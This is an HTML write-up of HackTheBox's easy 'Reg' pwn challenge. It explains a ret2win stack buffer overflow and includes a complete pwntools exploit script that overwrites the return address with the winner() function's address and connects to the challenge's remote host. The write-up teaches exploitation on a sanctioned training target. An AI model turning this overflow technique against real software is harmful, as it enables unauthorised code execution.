<div class="page-header">
    <div class="page-header-inner">
        <div class="page-header-inner2">
            <h1>PWN/Reg - Easy</h1>
            <h2>July 2021</h2>
            <h4>Ret2win</h4>
        </div>
    </div>
</div>
<H4>Problem</H4>
<div class="paragraph">
    <p>
    This is a basic buffer flow exploit. Try to get the flag.
    <br>
    </p>
</div>
<H4>Solution</H4>
<div class="paragraph">
    <p>
    	This challenge gives us a binary to download and develop the exploit for locally, and then an address to connect to remotely and retrieve the flag from using the developed exploit.
        <br><br>
    	This is htb's easiest pwn challenge and serves as an extremely straightforward introduction to pwn. All protections except NX are disabled, we have a winner() function and a buffer overflow. 
    	<br><br>
    </p>
</div>
<div>
    <img src="../imgs/hackthebox/reg1.png" alt="">
</div>
<div class="paragraph">
    <p>
        <br><br>
        We can simply overflow the buffer in the run() function and overwrite run()'s return address on the stack with the address of the winner() function. The winner function will then print out the flag for us. <br><br> The full exploit is posted below. 
        <br><br>
    </p>
</div>
<div>
    <img src="../imgs/hackthebox/reg9.png" alt="">
</div>
<div class="highlight" style="background: #002b36"><pre style="line-height: 125%;"><span></span><span style="color: #586e75; font-style: italic">#!/usr/bin/env python</span>

<span style="color: #cb4b16">from</span> <span style="color: #268bd2">pwn</span> <span style="color: #cb4b16">import</span> <span style="color: #586e75">*</span>
<span style="color: #839496">elf</span> <span style="color: #586e75">=</span> <span style="color: #839496">context</span><span style="color: #586e75">.</span><span style="color: #839496">binary</span> <span style="color: #586e75">=</span> <span style="color: #839496">ELF(</span><span style="color: #2aa198">'./vuln'</span><span style="color: #839496">)</span>
<span style="color: #839496">libc</span> <span style="color: #586e75">=</span> <span style="color: #839496">elf</span><span style="color: #586e75">.</span><span style="color: #839496">libc</span>

<span style="color: #839496">local</span> <span style="color: #586e75">=</span> <span style="color: #2aa198">False</span>

<span style="color: #859900">if</span> <span style="color: #839496">local:</span>
    <span style="color: #839496">p</span> <span style="color: #586e75">=</span> <span style="color: #839496">elf</span><span style="color: #586e75">.</span><span style="color: #839496">process()</span>
<span style="color: #859900">else</span><span style="color: #839496">:</span>
    <span style="color: #839496">host</span> <span style="color: #586e75">=</span> <span style="color: #2aa198">'188.166.173.208'</span>
    <span style="color: #839496">port</span> <span style="color: #586e75">=</span> <span style="color: #2aa198">30663</span>
    <span style="color: #839496">p</span> <span style="color: #586e75">=</span> <span style="color: #839496">remote(host,port)</span>

<span style="color: #839496">payload</span> <span style="color: #586e75">=</span> <span style="color: #2aa198">b'A'</span><span style="color: #586e75">*</span><span style="color: #2aa198">56</span> <span style="color: #586e75">+</span> <span style="color: #839496">p64(elf</span><span style="color: #586e75">.</span><span style="color: #839496">sym</span><span style="color: #586e75">.</span><span style="color: #839496">winner)</span>
<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">sendline(payload)</span>

<span style="color: #839496">p</span><span style="color: #586e75">.</span><span style="color: #839496">interactive()</span>
</pre></div>
<br><br>
<script>try {pageOpenedDirectly;} catch(e) {var loc = window.location.pathname;var dir = loc.substring(0, loc.lastIndexOf('/'));dir = dir.split("/")[dir.split("/").length-1];let currentLoc = location.href;let currentFile = location.href.split("/").slice(-1);currentLoc = currentLoc.replace(currentFile,"");currentLoc = currentLoc.replace(dir,"");currentLoc = currentLoc.slice(0, -1);if (currentFile[0].indexOf(".html") !== -1) currentFile = currentFile[0].slice(0, -5);window.location = currentLoc+"?p="+currentFile+"&d="+dir;}</script>